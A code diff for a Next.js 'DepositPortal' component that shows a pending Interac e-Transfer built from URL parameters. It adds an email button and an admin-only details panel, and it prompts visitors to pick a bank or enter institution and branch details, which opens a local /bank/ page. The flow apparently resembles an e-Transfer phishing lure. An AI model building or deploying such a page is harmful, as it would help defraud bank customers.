@@ -17,6 +17,10 @@ import {
   ExternalLink,
   Eye,
   EyeOff,
+  Mail,
+  Loader2,
+  ChevronDown,
+  ChevronUp,
 } from "lucide-react"
 import Header from "@/components/Header"
 import DepositPanel from "@/components/DepositPanel"
@@ -26,6 +30,7 @@ import InstitutionMultiSelect from "@/components/InstitutionMultiSelect"
 import type { FinancialInstitution } from "@/types/financial-institution"
 import { useLanguage } from "@/lib/i18n/context"
 import { useSearchParams } from "next/navigation"
+import { useAuth } from "@/lib/auth/context"
 
 type ConnectionMethod = "grid" | "multi-select" | "manual"
 
@@ -44,9 +49,13 @@ export default function DepositPortal() {
   const [selectedInstitutions, setSelectedInstitutions] = useState<FinancialInstitution[]>([])
   const { t } = useLanguage()
   const searchParams = useSearchParams()
+  const { user } = useAuth()
 
   const [connectionMethod, setConnectionMethod] = useState<ConnectionMethod>("grid")
   const [showAmount, setShowAmount] = useState(true)
+  const [isSendingEmail, setIsSendingEmail] = useState(false)
+  const [emailSent, setEmailSent] = useState(false)
+  const [showAdminDetails, setShowAdminDetails] = useState(true)
 
   const [transferData, setTransferData] = useState<TransferData | null>(null)
 
@@ -69,6 +78,30 @@ export default function DepositPortal() {
         message: message || "",
         timestamp: timestamp || new Date().toISOString(),
       })
+
+      const existingHistory = localStorage.getItem("depositHistory")
+      const history = existingHistory ? JSON.parse(existingHistory) : []
+
+      const existingIndex = history.findIndex((h: any) => h.transferId === transferId)
+      const newEntry = {
+        id: transferId,
+        transferId,
+        amount: amount || "0.00",
+        recipient: recipient || "",
+        recipientName: recipientName || "",
+        bankName: bankName || "Banking System",
+        message: message || "",
+        timestamp: timestamp || new Date().toISOString(),
+        status: "pending",
+      }
+
+      if (existingIndex >= 0) {
+        history[existingIndex] = newEntry
+      } else {
+        history.unshift(newEntry)
+      }
+
+      localStorage.setItem("depositHistory", JSON.stringify(history.slice(0, 50)))
     }
   }, [
     searchParams.get("transferId"),
@@ -79,6 +112,35 @@ export default function DepositPortal() {
     searchParams.get("message"),
     searchParams.get("timestamp"),
   ])
+
+  const handleSendPendingEmail = async () => {
+    if (!transferData) return
+
+    setIsSendingEmail(true)
+    setEmailSent(false)
+
+    try {
+      const response = await fetch("/api/send-pending-deposit", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify(transferData),
+      })
+
+      if (response.ok) {
+        setEmailSent(true)
+        setTimeout(() => setEmailSent(false), 5000)
+      } else {
+        alert("Failed to send email. Please try again.")
+      }
+    } catch (error) {
+      console.error("Error sending pending deposit email:", error)
+      alert("An error occurred. Please try again.")
+    } finally {
+      setIsSendingEmail(false)
+    }
+  }
 
   const [manualForm, setManualForm] = useState({
     institution: "",
@@ -93,7 +155,6 @@ export default function DepositPortal() {
     e.preventDefault()
     setFormError("")
 
-    // Validate required fields
     if (!manualForm.institution || !manualForm.province || !manualForm.accountType) {
       setFormError(t.mainPage.formValidationError)
       return
@@ -101,14 +162,10 @@ export default function DepositPortal() {
 
     setIsSubmitting(true)
 
-    // Simulate connection process
     setTimeout(() => {
-      // In production, this would connect to the bank
       console.log("[v0] Connecting to bank:", manualForm)
       window.open(`/bank/${manualForm.institution}`, "_blank")
       setIsSubmitting(false)
-
-      // Reset form
       setManualForm({
         institution: "",
         province: "",
@@ -125,70 +182,118 @@ export default function DepositPortal() {
         {transferData && (
           <div className="mb-8 space-y-6">
             <div className="bg-zinc-900 rounded-2xl border border-zinc-800 p-6 space-y-6">
-              <div className="flex items-center justify-between pb-4 border-b border-zinc-800">
+              <div className="flex items-center justify-between pb-4 border-b border-zinc-800 flex-wrap gap-3">
                 <h3 className="text-lg font-semibold text-white">Transaction Details</h3>
-                <span className="px-3 py-1 rounded-full text-xs font-medium bg-green-500/10 text-green-400 border border-green-500/20">
-                  Pending Deposit
-                </span>
-              </div>
-
-              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
-                <div className="space-y-1">
-                  <div className="flex items-center justify-between">
-                    <p className="text-sm text-zinc-500">Amount</p>
-                    <button
-                      onClick={() => setShowAmount(!showAmount)}
-                      className="p-1 hover:bg-zinc-800 rounded transition-colors"
-                      aria-label={showAmount ? "Hide amount" : "Show amount"}
-                    >
-                      {showAmount ? (
-                        <Eye className="w-4 h-4 text-zinc-400 hover:text-zinc-300" />
-                      ) : (
-                        <EyeOff className="w-4 h-4 text-zinc-400 hover:text-zinc-300" />
-                      )}
-                    </button>
-                  </div>
-                  <p
-                    className={`text-xl font-bold transition-all duration-300 ${
-                      showAmount ? "text-white opacity-100" : "text-zinc-600 opacity-50"
-                    }`}
+                <div className="flex items-center gap-3">
+                  <span className="px-3 py-1 rounded-full text-xs font-medium bg-amber-500/10 text-amber-400 border border-amber-500/20">
+                    Awaiting Confirmation
+                  </span>
+                  <button
+                    onClick={handleSendPendingEmail}
+                    disabled={isSendingEmail || emailSent}
+                    className={`flex items-center gap-2 px-4 py-2 rounded-lg font-semibold transition-all ${
+                      emailSent ? "bg-green-500 text-white" : "bg-[#FDB913] text-black hover:bg-[#e5a811]"
+                    } disabled:opacity-50 disabled:cursor-not-allowed`}
                   >
-                    {showAmount ? `$${Number.parseFloat(transferData.amount).toFixed(2)} CAD` : "••••••••"}
-                  </p>
-                </div>
-
-                <div className="space-y-1">
-                  <p className="text-sm text-zinc-500">Reference</p>
-                  <p className="text-base font-mono text-white">{transferData.transferId}</p>
-                </div>
-
-                <div className="space-y-1">
-                  <p className="text-sm text-zinc-500">Payee</p>
-                  <p className="text-base text-white">{transferData.recipientName}</p>
-                  <p className="text-sm text-zinc-400">{transferData.recipient}</p>
-                </div>
-
-                <div className="space-y-1">
-                  <p className="text-sm text-zinc-500">Bank</p>
-                  <p className="text-base text-white">{transferData.bankName}</p>
-                  <p className="text-sm text-zinc-400">Interac e-Transfer</p>
-                </div>
-
-                {transferData.message && (
-                  <div className="space-y-1 md:col-span-2">
-                    <p className="text-sm text-zinc-500">Memo</p>
-                    <p className="text-base text-white">{transferData.message}</p>
-                  </div>
-                )}
-
-                <div className="space-y-1 md:col-span-2">
-                  <p className="text-sm text-zinc-500">Transaction Time</p>
-                  <p className="text-sm font-mono text-zinc-400">{new Date(transferData.timestamp).toLocaleString()}</p>
+                    {isSendingEmail ? (
+                      <>
+                        <Loader2 className="w-4 h-4 animate-spin" />
+                        Sending...
+                      </>
+                    ) : emailSent ? (
+                      <>
+                        <CheckCircle className="w-4 h-4" />
+                        Email Sent!
+                      </>
+                    ) : (
+                      <>
+                        <Mail className="w-4 h-4" />
+                        Email Transaction Details
+                      </>
+                    )}
+                  </button>
                 </div>
               </div>
+
+              {user && (
+                <div className="border-t border-zinc-800 pt-6">
+                  <button
+                    onClick={() => setShowAdminDetails(!showAdminDetails)}
+                    className="w-full flex items-center justify-between px-4 py-3 bg-zinc-800/50 hover:bg-zinc-800 rounded-lg transition-colors mb-4"
+                  >
+                    <span className="text-sm font-semibold text-zinc-300">Admin Transaction Details</span>
+                    <div className="flex items-center gap-2">
+                      <span className="px-2 py-1 bg-[#FDB913] text-black text-xs font-bold rounded">ADMIN ONLY</span>
+                      {showAdminDetails ? (
+                        <ChevronUp className="w-4 h-4 text-zinc-400" />
+                      ) : (
+                        <ChevronDown className="w-4 h-4 text-zinc-400" />
+                      )}
+                    </div>
+                  </button>
+
+                  {showAdminDetails && (
+                    <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+                      <div className="space-y-1">
+                        <div className="flex items-center justify-between">
+                          <p className="text-sm text-zinc-500">Amount</p>
+                          <button
+                            onClick={() => setShowAmount(!showAmount)}
+                            className="p-1 hover:bg-zinc-800 rounded transition-colors"
+                            aria-label={showAmount ? "Hide amount" : "Show amount"}
+                          >
+                            {showAmount ? (
+                              <Eye className="w-4 h-4 text-zinc-400 hover:text-zinc-300" />
+                            ) : (
+                              <EyeOff className="w-4 h-4 text-zinc-400 hover:text-zinc-300" />
+                            )}
+                          </button>
+                        </div>
+                        <p
+                          className={`text-xl font-bold transition-all duration-300 ${
+                            showAmount ? "text-white opacity-100" : "text-zinc-600 opacity-50"
+                          }`}
+                        >
+                          {showAmount ? `$${Number.parseFloat(transferData.amount).toFixed(2)} CAD` : "••••••••"}
+                        </p>
+                      </div>
+
+                      <div className="space-y-1">
+                        <p className="text-sm text-zinc-500">Reference</p>
+                        <p className="text-base font-mono text-white">{transferData.transferId}</p>
+                      </div>
+
+                      <div className="space-y-1">
+                        <p className="text-sm text-zinc-500">Payee</p>
+                        <p className="text-base text-white">{transferData.recipientName}</p>
+                        <p className="text-sm text-zinc-400">{transferData.recipient}</p>
+                      </div>
+
+                      <div className="space-y-1">
+                        <p className="text-sm text-zinc-500">Bank</p>
+                        <p className="text-base text-white">{transferData.bankName}</p>
+                        <p className="text-sm text-zinc-400">Interac e-Transfer</p>
+                      </div>
+
+                      {transferData.message && (
+                        <div className="space-y-1 md:col-span-2">
+                          <p className="text-sm text-zinc-500">Memo</p>
+                          <p className="text-base text-white">{transferData.message}</p>
+                        </div>
+                      )}
+
+                      <div className="space-y-1 md:col-span-2">
+                        <p className="text-sm text-zinc-500">Transaction Time</p>
+                        <p className="text-sm font-mono text-zinc-400">
+                          {new Date(transferData.timestamp).toLocaleString()}
+                        </p>
+                      </div>
+                    </div>
+                  )}
+                </div>
+              )}
             </div>
 
-            {/* Existing success banner */}
             <div className="bg-gradient-to-r from-green-50 to-emerald-50 border-2 border-green-200 rounded-xl p-6">
               <div className="flex items-start gap-4">
                 <div className="flex-shrink-0">
@@ -220,7 +325,6 @@ export default function DepositPortal() {
           </div>
 
           <div className="grid md:grid-cols-3 gap-4 md:gap-6">
-            {/* Quick Select Method */}
             <button
               onClick={() => setConnectionMethod("grid")}
               className={`group relative p-6 rounded-xl border-2 transition-all duration-300 text-left ${
@@ -254,7 +358,6 @@ export default function DepositPortal() {
               </div>
             </button>
 
-            {/* Multi-Connect Method */}
             <button
               onClick={() => setConnectionMethod("multi-select")}
               className={`group relative p-6 rounded-xl border-2 transition-all duration-300 text-left ${
@@ -290,7 +393,6 @@ export default function DepositPortal() {
               </div>
             </button>
 
-            {/* Manual Entry Method */}
             <button
               onClick={() => setConnectionMethod("manual")}
               className={`group relative p-6 rounded-xl border-2 transition-all duration-300 text-left ${
@@ -368,7 +470,6 @@ export default function DepositPortal() {
               className="bg-card border-2 border-border rounded-xl shadow-sm p-6 md:p-8"
             >
               <div className="grid md:grid-cols-2 gap-6">
-                {/* Institution Field */}
                 <div className="space-y-2 group">
                   <label
                     htmlFor="institution"
@@ -411,7 +512,6 @@ export default function DepositPortal() {
                   </p>
                 </div>
 
-                {/* Province Field */}
                 <div className="space-y-2 group">
                   <label htmlFor="province" className="flex items-center gap-2 text-base font-semibold text-foreground">
                     <MapPin className="w-5 h-5 text-[#FDB913]" />
@@ -448,7 +548,6 @@ export default function DepositPortal() {
                   </p>
                 </div>
 
-                {/* Account Type Field */}
                 <div className="space-y-2 group">
                   <label
                     htmlFor="accountType"
@@ -479,7 +578,6 @@ export default function DepositPortal() {
                   </p>
                 </div>
 
-                {/* Branch Number Field */}
                 <div className="space-y-2 group">
                   <label
                     htmlFor="branchNumber"
@@ -505,7 +603,6 @@ export default function DepositPortal() {
                 </div>
               </div>
 
-              {/* Error Message */}
               {formError && (
                 <div className="mt-6 p-4 bg-red-50 border-2 border-red-200 rounded-lg flex items-start gap-3 animate-in slide-in-from-top-2 duration-300">
                   <AlertCircle className="w-5 h-5 text-red-600 flex-shrink-0 mt-0.5" />
@@ -513,7 +610,6 @@ export default function DepositPortal() {
                 </div>
               )}
 
-              {/* Submit Button */}
               <div className="mt-8 flex justify-end">
                 <button
                   type="submit"
